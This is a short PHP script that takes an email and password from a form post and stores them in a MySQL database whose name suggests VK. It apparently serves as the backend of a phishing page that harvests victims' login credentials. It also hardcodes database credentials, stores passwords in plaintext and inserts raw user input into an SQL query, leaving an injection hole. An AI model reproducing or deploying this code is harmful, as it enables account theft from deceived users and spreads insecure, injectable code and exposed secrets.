<?php
$host = "mysql.hostinger.es";
$user = "u431843422_root";
$password = "QwErTy123";
$db = "u431843422_vk";
if (!$conn = mysql_connect($host, $user, $password))
{
echo "<h2>MySQL Error!</h2>";
exit;
}
$email = $_POST['email'];
$pass = $_POST['pass'];
mysql_select_db($db);
$result = mysql_query("INSERT INTO user (login, pass) VALUES('$email', '$pass')");
if ($result == 'true') {
	echo "done";
}
else{
	echo "error";
}
?>
